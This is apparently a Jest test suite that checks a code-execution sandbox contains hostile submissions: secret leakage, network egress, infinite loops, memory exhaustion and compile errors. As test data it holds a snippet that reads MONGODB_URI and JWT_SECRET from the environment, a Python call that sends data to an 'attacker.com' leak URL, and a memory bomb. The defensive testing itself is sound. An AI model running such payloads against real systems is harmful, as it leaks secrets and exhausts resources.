import { jest } from '@jest/globals';
import { providerRegistry } from '../src/services/execution/providerRegistry.js';
import { RenderSandboxProvider } from '../src/services/execution/RenderSandboxProvider.js';
import { validateSingleTestCase } from '../src/services/codeRunner.service.js';

describe('Phase 4: Hostile-Code Security Containment Test Suite', () => {
  const originalFetch = global.fetch;

  afterEach(() => {
    jest.restoreAllMocks();
    global.fetch = originalFetch;
  });

  // ── 1. Environment Variable Exfiltration Attack ────────────────────────────
  describe('Environment Variable & Secret Exfiltration Defense', () => {
    test('Host environment secrets (MONGODB_URI, JWT_SECRET) are never passed to sandbox', async () => {
      let capturedPayload = null;

      global.fetch = jest.fn().mockImplementation((url, options) => {
        capturedPayload = JSON.parse(options.body);
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({
            status: 'success',
            output: 'CLEAN_OUTPUT',
            error: null,
            runtimeMs: 20
          })
        });
      });

      const provider = new RenderSandboxProvider({
        endpoint: 'https://sandbox.testforge.internal'
      });

      const hostileCode = `
const secret = process.env.MONGODB_URI || process.env.JWT_SECRET || process.env.REDIS_URL;
console.log(secret ? 'LEAKED:' + secret : 'NO_SECRETS');
`;

      await provider.executeCode({
        language: 'javascript',
        code: hostileCode,
        inputArgs: []
      });

      expect(capturedPayload).toBeDefined();
      // Ensure the outbound sandbox payload does not include any application environment secrets
      const serialized = JSON.stringify(capturedPayload);
      expect(serialized).not.toContain('mongodb+srv');
      expect(serialized).not.toContain('super_secure');
      expect(serialized).not.toContain('valkey');
    });
  });

  // ── 2. Network Exfiltration Attack ─────────────────────────────────────────
  describe('Outbound Network Egress Defense', () => {
    test('Ensures limits.network is strictly set to "none" in sandbox dispatch', async () => {
      let capturedPayload = null;

      global.fetch = jest.fn().mockImplementation((url, options) => {
        capturedPayload = JSON.parse(options.body);
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({
            status: 'success',
            output: null,
            error: 'Network disabled: connection refused',
            runtimeMs: 30
          })
        });
      });

      const provider = new RenderSandboxProvider({
        endpoint: 'https://sandbox.testforge.internal'
      });

      const networkAttackCode = `
import urllib.request
try:
    urllib.request.urlopen("https://attacker.com/leak?data=test", timeout=1)
except Exception as e:
    print("BLOCKED:" + str(e))
`;

      await provider.executeCode({
        language: 'python',
        code: networkAttackCode,
        inputArgs: []
      });

      expect(capturedPayload.limits.network).toBe('none');
    });
  });

  // ── 3. Infinite Loop & Resource Exhaustion Defense ─────────────────────────
  describe('Infinite Loop & Resource Exhaustion Defense', () => {
    test('Simulated infinite loop triggers status: timeout and is contained within deadline', async () => {
      const mockProvider = providerRegistry.getProvider('mock');

      const testCase = {
        _id: 'tc_timeout',
        input: '10',
        expectedOutput: '10'
      };

      const result = await validateSingleTestCase({
        testCase,
        code: 'function solve() { while(true) {} } // SIMULATE_TIMEOUT',
        questionContext: {
          title: 'Infinite Loop Problem',
          language: 'javascript'
        },
        timeoutMs: 100,
        provider: mockProvider
      });

      expect(result.status).toBe('timeout');
      expect(result.passed).toBe(false);
      expect(result.error).toMatch(/timed out/i);
    });

    test('Simulated memory exhaustion returns status: memory_limit_exceeded', async () => {
      const mockProvider = providerRegistry.getProvider('mock');
      mockProvider.setHandler(() => ({
        status: 'memory_limit_exceeded',
        output: null,
        error: 'Process memory ceiling exceeded (256MB limit)',
        runtimeMs: 15
      }));

      const testCase = {
        _id: 'tc_mem',
        input: '1',
        expectedOutput: '1'
      };

      const result = await validateSingleTestCase({
        testCase,
        code: 'const a = []; while(true) a.push(new Array(1e6));',
        questionContext: {
          title: 'Memory Bomb',
          language: 'javascript'
        },
        provider: mockProvider
      });

      expect(result.status).toBe('memory_limit_exceeded');
      expect(result.passed).toBe(false);
      expect(result.error).toMatch(/memory/i);
    });
  });

  // ── 4. Compilation & Syntax Error Defense ──────────────────────────────────
  describe('Compilation & Syntax Error Defense', () => {
    test('Compilation errors in C++ do not crash runner and map to compilation_error', async () => {
      const mockProvider = providerRegistry.getProvider('mock');
      mockProvider.setHandler(() => ({
        status: 'compilation_error',
        output: null,
        error: 'main.cpp:3:5: error: unknown type name "invalid_syntax"',
        runtimeMs: 10
      }));

      const testCase = {
        _id: 'tc_comp',
        input: '0',
        expectedOutput: '0'
      };

      const result = await validateSingleTestCase({
        testCase,
        code: 'invalid_syntax_code',
        questionContext: {
          title: 'Compile Error Test',
          language: 'cpp'
        },
        provider: mockProvider
      });

      expect(result.status).toBe('compilation_error');
      expect(result.passed).toBe(false);
      expect(result.error).toMatch(/unknown type name/i);
    });
  });
});
